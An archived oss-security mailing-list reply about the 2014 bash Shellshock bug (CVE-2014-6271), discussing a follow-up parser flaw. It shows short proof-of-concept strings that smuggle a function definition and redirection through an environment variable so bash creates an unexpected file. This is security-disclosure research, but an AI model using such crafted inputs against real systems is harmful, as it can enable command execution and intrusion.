X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/24/40
Message-ID: <CALx_OUCdcWGgJp_tXMXiann4Z4p_LO6BZ0+BNabPk4zhruhi4w@mail.gmail.com>
Date: Wed, 24 Sep 2014 15:37:03 -0700
From: Michal Zalewski <lcamtuf@...edump.cx>
To: oss-security@...ts.openwall.com
Cc: Tavis Ormandy <taviso@...xchg8b.com>
Subject: Re: CVE-2014-6271: remote code execution through bash
Content-Type: text/plain; charset=utf-8

> Tavis Ormandy just tweetet this:
> https://twitter.com/taviso/status/514887394294652929

> $ env X='() { (a)=>\' sh -c "echo date"; cat echo

This can be simplified as:

$ X='() { function a a>\' bash -c echo
$ ls echo
echo

And the core parsing problem is illustrated by this:

$ function a a>\ [RETURN]
> foo
$ whatever
$ ls
whatever

Tavis and I spent a fair amount of time trying to figure out if this
poses a more immediate risk, but so far, no dice. It strongly suggests
that the parser is fragile and that there may be unexpected side
effects, though; parsing functions seen in HTTP_* and such seems like
a very risky proposition.

/mz
